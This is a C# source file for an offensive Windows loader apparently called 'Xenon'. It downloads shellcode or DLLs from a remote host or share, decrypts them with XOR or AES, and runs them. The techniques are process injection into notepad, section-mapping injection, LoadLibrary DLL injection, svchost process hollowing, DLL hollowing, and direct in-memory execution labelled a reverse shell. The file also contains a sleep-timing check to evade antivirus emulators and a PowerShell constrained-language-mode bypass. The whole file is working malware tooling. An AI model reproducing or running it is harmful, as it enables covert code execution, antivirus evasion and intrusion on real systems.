using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Net;
using System.Collections.ObjectModel;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Injector
{
    public class Arguments
    {
        /// <summary>
        /// Splits the command line. When main(string[] args) is used escaped quotes (ie a path "c:\folder\")
        /// Will consume all the following command line arguments as the one argument. 
        /// This function ignores escaped quotes making handling paths much easier.
        /// </summary>
        /// <param name="commandLine">The command line.</param>
        /// <returns></returns>
        public static string[] SplitCommandLine(string commandLine)
        {
            var translatedArguments = new StringBuilder(commandLine);
            var escaped = false;
            for (var i = 0; i < translatedArguments.Length; i++)
            {
                if (translatedArguments[i] == '"')
                {
                    escaped = !escaped;
                }
                if (translatedArguments[i] == ' ' && !escaped)
                {
                    translatedArguments[i] = '\n';
                }
            }

            var toReturn = translatedArguments.ToString().Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
            for (var i = 0; i < toReturn.Length; i++)
            {
                toReturn[i] = RemoveMatchingQuotes(toReturn[i]);
            }
            return toReturn;
        }

        public static string RemoveMatchingQuotes(string stringToTrim)
        {
            var firstQuoteIndex = stringToTrim.IndexOf('"');
            var lastQuoteIndex = stringToTrim.LastIndexOf('"');
            while (firstQuoteIndex != lastQuoteIndex)
            {
                stringToTrim = stringToTrim.Remove(firstQuoteIndex, 1);
                stringToTrim = stringToTrim.Remove(lastQuoteIndex - 1, 1); //-1 because we've shifted the indicies left by one
                firstQuoteIndex = stringToTrim.IndexOf('"');
                lastQuoteIndex = stringToTrim.LastIndexOf('"');
            }

            return stringToTrim;
        }

        private readonly Dictionary<string, Collection<string>> _parameters;
        private string _waitingParameter;

        public Arguments(IEnumerable<string> arguments)
        {
            _parameters = new Dictionary<string, Collection<string>>();

            string[] parts;

            //Splits on beginning of arguments ( - and -- and / )
            //And on assignment operators ( = and : )
            var argumentSplitter = new Regex(@"^-{1,2}|^/|=|:",
                RegexOptions.IgnoreCase | RegexOptions.Compiled);

            foreach (var argument in arguments)
            {
                parts = argumentSplitter.Split(argument, 3);
                switch (parts.Length)
                {
                    case 1:
                        AddValueToWaitingArgument(parts[0]);
                        break;
                    case 2:
                        AddWaitingArgumentAsFlag();

                        //Because of the split index 0 will be a empty string
                        _waitingParameter = parts[1];
                        break;
                    case 3:
                        AddWaitingArgumentAsFlag();

                        //Because of the split index 0 will be a empty string
                        string valuesWithoutQuotes = RemoveMatchingQuotes(parts[2]);

                        AddListValues(parts[1], valuesWithoutQuotes.Split(','));
                        break;
                }
            }

            AddWaitingArgumentAsFlag();
        }

        private void AddListValues(string argument, IEnumerable<string> values)
        {
            foreach (var listValue in values)
            {
                Add(argument, listValue);
            }
        }

        private void AddWaitingArgumentAsFlag()
        {
            if (_waitingParameter == null) return;

            AddSingle(_waitingParameter, "true");
            _waitingParameter = null;
        }

        private void AddValueToWaitingArgument(string value)
        {
            if (_waitingParameter == null) return;

            value = RemoveMatchingQuotes(value);

            Add(_waitingParameter, value);
            _waitingParameter = null;
        }

        /// <summary>
        /// Gets the count.
        /// </summary>
        /// <value>The count.</value>
        public int Count
        {
            get
            {
                return _parameters.Count;
            }
        }

        /// <summary>
        /// Adds the specified argument.
        /// </summary>
        /// <param name="argument">The argument.</param>
        /// <param name="value">The value.</param>
        public void Add(string argument, string value)
        {
            if (!_parameters.ContainsKey(argument))
                _parameters.Add(argument, new Collection<string>());

            _parameters[argument].Add(value);
        }

        public void AddSingle(string argument, string value)
        {
            if (!_parameters.ContainsKey(argument))
                _parameters.Add(argument, new Collection<string>());
            else
                throw new ArgumentException(string.Format("Argument {0} has already been defined", argument));

            _parameters[argument].Add(value);
        }

        /// <summary>
        /// Determines whether the specified argument is true.
        /// </summary>
        /// <param name="argument">The argument.</param>
        /// <returns>
        ///     <c>true</c> if the specified argument is true; otherwise, <c>false</c>.
        /// </returns>
        public bool IsTrue(string argument)
        {
            AssertSingle(argument);

            var arg = this[argument];

            return arg != null && arg[0].Equals("true", StringComparison.OrdinalIgnoreCase);
        }

        private void AssertSingle(string argument)
        {
            if (this[argument] != null && this[argument].Count > 1)
                throw new ArgumentException(string.Format("{0} has been specified more than once, expecting single value", argument));
        }

        public string Single(string argument)
        {
            AssertSingle(argument);

            //only return value if its NOT true, there is only a single item for that argument
            //and the argument is defined
            if (this[argument] != null && !IsTrue(argument))
                return this[argument][0];

            return null;
        }

        public bool Exists(string argument)
        {
            return (this[argument] != null && this[argument].Count > 0);
        }

        /// <summary>
        /// Gets the <see cref="System.Collections.ObjectModel.Collection&lt;T&gt;"/> with the specified parameter.
        /// </summary>
        /// <value></value>
        public Collection<string> this[string parameter]
        {
            get
            {
                return _parameters.ContainsKey(parameter) ? _parameters[parameter] : null;
            }
        }
    }

    // Global class for more falgs
    public static class Flags
    {
        public static int advanced_bypass = 0;
    }

    public class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DOS_HEADER
        {
            public char[] e_magic;       // Magic number
            public UInt16 e_cblp;    // Bytes on last page of file
            public UInt16 e_cp;      // Pages in file
            public UInt16 e_crlc;    // Relocations
            public UInt16 e_cparhdr;     // Size of header in paragraphs
            public UInt16 e_minalloc;    // Minimum extra paragraphs needed
            public UInt16 e_maxalloc;    // Maximum extra paragraphs needed
            public UInt16 e_ss;      // Initial (relative) SS value
            public UInt16 e_sp;      // Initial SP value
            public UInt16 e_csum;    // Checksum
            public UInt16 e_ip;      // Initial IP value
            public UInt16 e_cs;      // Initial (relative) CS value
            public UInt16 e_lfarlc;      // File address of relocation table
            public UInt16 e_ovno;    // Overlay number
            public UInt16[] e_res1;    // Reserved words
            public UInt16 e_oemid;       // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo;     // OEM information; e_oemid specific
            public UInt16[] e_res2;    // Reserved words
            public Int32 e_lfanew;      // File address of new exe header
        }

        private struct PROCESS_BASIC_INFORMATION
        {
            public UIntPtr ExitStatus;
            public IntPtr PebBaseAddress;
            public UIntPtr AffinityMask;
            public UIntPtr BasePriority;
            public UIntPtr UniqueProcessId;
            public UIntPtr InheritedFromUniqueProcessId;
        }

        private static uint PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF;
        private static uint EXECUTE_READ_WRITE = 0x40;
        private static uint SEC_COMMIT = 0x08000000;
        private static uint SECTION_MAP_WRITE = 0x0002;
        private static uint SECTION_MAP_READ = 0x0004;
        private static uint SECTION_MAP_EXECUTE = 0x0008;
        private static uint SECTION_ALL_ACCESS = SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE;

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpthread);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32")]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll", SetLastError = true)]
        static extern UInt32 ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);

        [DllImport("kernel32", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern uint NtCreateSection(ref IntPtr SectionHandle, uint DesiredAccess, IntPtr ObjectAttributes, ref uint MaximumSize, uint SectionPageProtection, uint AllocationAttributes, IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        public const string phantom = @"dll_hollow.dll";
        [DllImport(phantom, CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Ansi)]
        static extern int dll_hollow(byte[] shellcode, int size, int pid);

        public static string CreateMD5(string input)
        {
            // Use input string to calculate MD5 hash
            using (System.Security.Cryptography.MD5 md5 = System.Security.Cryptography.MD5.Create())
            {
                byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);
                byte[] hashBytes = md5.ComputeHash(inputBytes);

                // Convert the byte array to hexadecimal string
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < hashBytes.Length; i++)
                {
                    sb.Append(hashBytes[i].ToString("X2"));
                }
                return sb.ToString();
            }
        }
        
        static byte[] aes_decryption(byte[] shellcode, string password)
        {
            string iv = "1234567891234567";
            AesCryptoServiceProvider keydecrypt = new AesCryptoServiceProvider();
            keydecrypt.BlockSize = 128;
            keydecrypt.KeySize = 128;
            keydecrypt.Key = System.Text.Encoding.UTF8.GetBytes(password);
            keydecrypt.IV = System.Text.Encoding.UTF8.GetBytes(iv);
            keydecrypt.Padding = PaddingMode.PKCS7;
            keydecrypt.Mode = CipherMode.CBC;
            ICryptoTransform crypto1 = keydecrypt.CreateDecryptor(keydecrypt.Key, keydecrypt.IV);

            byte[] returnbytearray = crypto1.TransformFinalBlock(shellcode, 0, shellcode.Length);
            crypto1.Dispose();
            return returnbytearray;
        }

        static byte[] xor_decryption(byte[] shellcode, string password)
        {

            byte[] pass = Encoding.ASCII.GetBytes(password);

            byte[] decode_shellcode = new byte[shellcode.Length];
            int j = 0;
            for (int i = 0; i < shellcode.Length; i++)
            {
                if (j >= password.Length)
                {
                    j = 0;
                }
                decode_shellcode[i] = (byte)(((uint)shellcode[i] ^ (uint)pass[j]) & 0xff);
            }
            return decode_shellcode;
        }

        static byte[] downloaded_data(string location, int encryption, string password)
        {
            byte[] shellcode;
            if (location.StartsWith("http") || location.StartsWith("\\"))
            {
                WebClient wc = new WebClient();
                string url = location;
                shellcode = wc.DownloadData(url);
            }
            else
            {
                shellcode = File.ReadAllBytes(location);
            }

            if (encryption != 0)
            {
                if (encryption == 1)
                {
                    // xor encryption used
                    byte[] decode_shellcode = xor_decryption(shellcode, password);
                    return decode_shellcode;
                }
                else if (encryption == 2)
                {
                    byte[] decoded_shellcode = aes_decryption(shellcode, password);
                    return decoded_shellcode;
                }
            }
            return shellcode;
        }

        static int process_injection(string location, int button, int encryption, string password)
        {
            Process[] remote_p = Process.GetProcessesByName("notepad");
            Process current_p = Process.GetCurrentProcess();
            int pid = 0;

            if (remote_p.Length == 0)
            {
                //Create Process
                Process p = new Process();
                p.StartInfo.FileName = "C:\\Windows\\System32\\notepad.exe";
                p.StartInfo.WindowStyle = ProcessWindowStyle.Maximized;
                p.Start();
                pid = p.Id;
            }
            else
            {
                pid = remote_p[0].Id;
            }

            byte[] shellcode = downloaded_data(location, encryption, password);
            //Initializations
            bool res = false;
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
            IntPtr address = IntPtr.Zero;
            if (Flags.advanced_bypass == 0)
            {
                address = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                IntPtr bytes = IntPtr.Zero;
                res = WriteProcessMemory(hProcess, address, shellcode, shellcode.Length, out bytes);
                if (res == false)
                {
                    Console.WriteLine("Cannot copy into process");
                    return -1;
                }
                IntPtr thread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, address, IntPtr.Zero, 0, IntPtr.Zero);
                return 0;
            }
            else
            {
                IntPtr Section_handle = IntPtr.Zero;
                uint size = (uint)shellcode.Length;
                if (NtCreateSection(ref Section_handle, SECTION_ALL_ACCESS, IntPtr.Zero, ref size, 0x40, SEC_COMMIT, IntPtr.Zero) != 0)
                {
                    Console.WriteLine("[!] Cannot create section");
                    return -1;
                }
                IntPtr local_addr = IntPtr.Zero;
                IntPtr remote_addr = IntPtr.Zero;
                ulong offsec = 0;

                if (NtMapViewOfSection(Section_handle, current_p.Handle, ref local_addr, UIntPtr.Zero, UIntPtr.Zero, out offsec, out size, 2, 0, EXECUTE_READ_WRITE) != 0)
                {
                    Console.WriteLine("[!] Cannot map the section into remote process");
                    return -1;
                }

                if (NtMapViewOfSection(Section_handle, hProcess, ref remote_addr, UIntPtr.Zero, UIntPtr.Zero, out offsec, out size, 2, 0, EXECUTE_READ_WRITE) != 0)
                {
                    Console.WriteLine("Cannot map the section into local process");
                    return -1;
                }

                Marshal.Copy(shellcode, 0, local_addr, shellcode.Length);
                CreateRemoteThread(hProcess, IntPtr.Zero, 0, remote_addr, IntPtr.Zero, 0, IntPtr.Zero);
                NtUnmapViewOfSection(current_p.Handle, local_addr);
                return 0;
            }
        }

        static int reflective_dll_injection(string location)
        {
            Process[] remote_p = Process.GetProcessesByName("notepad");
            int pid = 0;

            if (remote_p.Length == 0)
            {
                //Create Process
                Process p = new Process();
                p.StartInfo.FileName = "C:\\Windows\\System32\\notepad.exe";
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.Start();
                pid = p.Id;
            }
            else
            {
                pid = remote_p[0].Id;
            }

            String dllName = "";

            if (location.StartsWith("http"))
            {
                WebClient wc = new WebClient();
                wc.DownloadFile(location, "C:\\Windows\\Temp\\meet.dll");
                dllName = "C:\\Windows\\Temp\\meet.dll";
            }
            else
            {
                dllName = location;
            }

            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
            IntPtr address = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr bytes = IntPtr.Zero;
            bool res = WriteProcessMemory(hProcess, address, Encoding.Default.GetBytes(dllName), dllName.Length, out bytes);
            if (res == false)
            {
                Console.WriteLine("Cannot copy into process");
                return -1;
            }
            IntPtr load_addr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            CreateRemoteThread(hProcess, IntPtr.Zero, 0, load_addr, address, 0, IntPtr.Zero);

            return 0;
        }

        static int basic_rev(string location, int encryption, string password)
        {
            byte[] shellcode = downloaded_data(location, encryption, password);
            IntPtr address = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr bytes = IntPtr.Zero;
            Marshal.Copy(shellcode, 0, address, shellcode.Length);
            IntPtr thread = CreateThread(IntPtr.Zero, 0, address, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(thread, 0xFFFFFFFF);
            return 0;
        }

        static int dll_hollowing(string location, int encryption, string password)
        {
            Process[] remote_p = Process.GetProcessesByName("notepad");
            int pid = 0;

            if (remote_p.Length == 0)
            {
                //Create Process
                Process p = new Process();
                p.StartInfo.FileName = "C:\\Windows\\System32\\notepad.exe";
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.Start();
                pid = p.Id;
            }
            else
            {
                pid = remote_p[0].Id;
            }

            byte[] shellcode = downloaded_data(location, encryption, password);
            //            IntPtr unmanagedArray = Marshal.AllocHGlobal(shellcode.Length);
            //            Marshal.Copy(shellcode, 0, unmanagedArray, shellcode.Length);
            int res = dll_hollow(shellcode, shellcode.Length, pid);
            //            Marshal.FreeHGlobal(unmanagedArray);
            return res;
        }

        static int process_hollowing(string location, int encryption, string password)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            if (res == false)
            {
                Console.WriteLine("[!] Error creating svchosts.exe");
                return -1;
            }
            PROCESS_BASIC_INFORMATION pib = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;

            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref pib, (uint)(UIntPtr.Size * 6), ref tmp);

            IntPtr PointerToPE = (IntPtr)((Int64)pib.PebBaseAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];

            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, PointerToPE, addrBuf, addrBuf.Length, out nRead);
            IntPtr SvcHostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, SvcHostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)SvcHostBase);

            // Get shellcode bytes from localtion
            byte[] shellcode = downloaded_data(location, encryption, password);
            WriteProcessMemory(hProcess, addressOfEntryPoint, shellcode, shellcode.Length, out nRead);
            ResumeThread(pi.hThread);
            return 0;
        }

        static void powershell_clm(String file_tmp)
        {
            Console.WriteLine("[+] Powershell CLM bypass!\n");
            Runspace rs = RunspaceFactory.CreateRunspace();
            String op_file = file_tmp;
            PowerShell ps = PowerShell.Create();
            while (true)
            {
                Console.Write("PS:>");
                string input = Console.ReadLine();
                if (input == "exit")
                {
                    break;
                }
                ps.AddScript(input + " | Out-File -FilePath " + op_file);
                ps.Invoke();
                string output = File.ReadAllText(op_file);
                Console.WriteLine(output);
                File.Delete(op_file);
            }
            rs.Close();
        }

        static void help_xenon()
        {
            Console.WriteLine("Help Options for Xenon:");
            Console.WriteLine("-m \t Mode of operation");
            Console.WriteLine("\t-m 1 \t Specifies the mode as Process injection");
            Console.WriteLine("\t-m 2 \t Specifies the mode as DLL Injection");
            Console.WriteLine("\t-m 3 \t Specifies the mode as Process Hollowing");
            Console.WriteLine("\t-m 4 \t No injection! Give me my damn shell\n");
            Console.WriteLine("\t-m 5 \t Powershell session via CLM bypass\n");
            Console.WriteLine("\t-m 6 \t DLL hollowing ");
            Console.WriteLine("-TempFile \t File location that your current user can read");
            Console.WriteLine("-shellcode \t Use shellcode");
            Console.WriteLine("-dll \t Use dll");
            Console.WriteLine("-decrypt-xor \t Specify Xor decryption for shellcode");
            Console.WriteLine("\t -pass \t Specifty the password for Xor decryption");
            Console.WriteLine("-decrypt-aes \t Specify aes decryption for shellcode");
            Console.WriteLine("\t -pass \t Specifty the password for aes decryption");
            Console.WriteLine("-location \t Specify the location i.e either server or local");
            Console.WriteLine("-bypass \tUses enhance attempts to bypass AV");
            return;
        }
        static int Main(string[] args)
        {
            //xenon.exe -m <1,2,3> --<shellcode/dll> --location <http://1.1.1.1/name, C:\\A\\B\\name> --<enc> --key <password>
            //IEnumerable<string> arg = Arguments.SplitCommandLine(string.Join(" ", args));
            IEnumerable<string> arg = args;
            var arguments = new Arguments(arg);

            if (arguments.Exists("m"))
            {
                int m = int.Parse(arguments.Single("m"));
                if (m == 5)
                {
                    if (arguments.Exists("TempFile"))
                    {
                        string name = arguments.Single("TempFile");
                        powershell_clm(name);
                        Console.WriteLine("Powershell session exit!");
                        return 0;
                    }
                    else
                    {
                        help_xenon();
                        return -1;
                    }
                }
            }

            if ((arguments.Exists("m") && arguments.Exists("location") && (arguments.Exists("shellcode") || arguments.Exists("dll"))) == false || arguments.Count < 3)
            {
                help_xenon();
                return -1;
            }

            // Sleep AV detection

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            if (DateTime.Now.Subtract(t1).TotalSeconds < 2)
            {
                Console.WriteLine("[!] AV Emulator detected! Behaving like a good boy :)");
                return 0;
            }

            //Options to transfer shellcode/DLL - Via SMB share and local disk (.dll for dll and .txt for shellcode)

            //1. Process injection via shellcode
            //2. Reflective Process injection via DLL (in memory)
            //3. Process Hollowing (shellcode)


            Console.WriteLine("[+] Parsing command line arguments");

            //Parsing Command line arguments
            int mode = int.Parse(arguments.Single("m"));
            string location = arguments.Single("location");
            int button = 0;

            if (arguments.Exists("shellcode"))
            {
                button = 1;
            }
            else
                button = 2;

            int decryption = 0;
            string pass = "";

            if (arguments.Exists("decrypt-xor"))
            {
                decryption = 1;
                pass = arguments.Single("pass");
                pass = CreateMD5(pass);
            }
            else if (arguments.Exists("decrypt-aes"))
            {
                decryption = 2;
                pass = arguments.Single("pass");
                pass = CreateMD5(pass);
            }

            if (arguments.Exists("bypass"))
            {
                Flags.advanced_bypass = 1;
            }

            // Dealing with command line arguments for main logic
            int response = 0;

            switch (mode)
            {
                case 1:
                    if (button == 1)
                        Console.WriteLine("Injecting into process via shellcode at " + location);
                    else
                        Console.WriteLine("Injecting into process via DLL at " + location);
                    response = process_injection(location, button, decryption, pass);

                    if (response == 0)
                        Console.WriteLine("[+] Process Injection done :)");
                    else
                        Console.WriteLine("[!] Error running the process injection module");
                    break;

                case 2:
                    Console.WriteLine("DLL Injection into process using DLL at " + location);
                    response = reflective_dll_injection(location);

                    if (response == 0)
                        Console.WriteLine("[+] DLL Injection done :)");
                    else
                        Console.WriteLine("[!] Error running the DLL injection module");
                    break;

                case 3:
                    Console.WriteLine("Using Process hollowing into process using DLL at " + location);
                    response = process_hollowing(location, decryption, pass);

                    if (response == 0)
                        Console.WriteLine("[+] Process hollowing done :)");
                    else
                        Console.WriteLine("[!] Error running the process hollowing module");
                    break;

                case 4:
                    Console.WriteLine("Getting a basic reverse shell for you using shellcode at " + location);
                    basic_rev(location, decryption, pass);
                    Console.WriteLine("Reverse Shell done :)");
                    break;

                case 6:
                    Console.WriteLine("DLL Hollowing in process! Using shellcode at " + location);
                    int res = dll_hollowing(location, decryption, pass);
                    if (res == 0)
                        Console.WriteLine("[+] DLL Hollowing done :)");
                    else
                        Console.WriteLine("[!] Error running the DLL hollowing module");
                    break;

                default:
                    Console.WriteLine("Mode not found");
                    break;
            }

            return 0;
        }
    }
}
